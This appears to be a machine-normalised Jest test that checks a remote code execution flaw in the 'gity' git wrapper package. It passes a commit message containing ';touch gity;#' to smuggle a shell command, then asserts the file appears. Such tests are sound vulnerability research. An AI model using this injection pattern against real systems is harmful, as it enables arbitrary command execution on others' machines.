const v35 = done => {
    const v19 = expect.assertions(2);
    v19;
    const Git = require('gity');
    const fs = require('fs');
    const path = './gity';
    try {
        const v20 = fs.existsSync(path);
        if (v20) {
            const v21 = fs.unlinkSync(path);
            v21;
            const v22 = console.log('File removed:', path);
            v22;
        }
    } catch (err) {
        const v23 = console.error(err);
        v23;
    }
    file_exist = fs.existsSync(path);
    const v24 = expect(file_exist);
    const v25 = v24.toBe(false);
    v25;
    try {
        const v26 = Git();
        const v27 = v26.add('*.js');
        const v28 = v27.commit('-m "added js files";touch gity;#');
        const v34 = () => {
            file_exist = fs.existsSync(path);
            const v29 = expect(file_exist);
            const v30 = v29.toBe(true);
            v30;
            const v32 = function (err) {
                const v31 = done();
                v31;
            };
            const v33 = fs.unlink(path, v32);
            v33;
        };
        let git = v28.run(v34);
    } catch (error) {
    }
};
const v36 = test('Remote code execution in gity', v35);
v36;